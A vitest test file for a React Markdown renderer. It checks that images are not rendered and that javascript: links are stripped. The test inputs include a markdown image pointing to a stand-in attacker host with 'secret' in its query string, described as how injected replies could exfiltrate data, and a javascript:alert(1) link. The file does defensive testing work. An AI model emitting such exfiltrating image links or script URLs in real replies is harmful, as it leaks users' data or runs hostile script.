import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { expect, it } from "vitest";
import { Markdown } from "./markdown";

const render = (md: string) => renderToStaticMarkup(createElement(Markdown, null, md));

it("does not render images, so injected replies cannot exfiltrate data on render", () => {
  const html = render("hi ![x](https://evil.example/?d=secret) there");
  expect(html).not.toContain("<img");
  expect(html).not.toContain("evil.example");
});
it("still renders links safely and strips javascript: URLs", () => {
  const html = render("[ok](https://example.org) [bad](javascript:alert(1))");
  expect(html).toContain('href="https://example.org"');
  expect(html).toContain('rel="noopener noreferrer"');
  expect(html).not.toContain("javascript:");
});
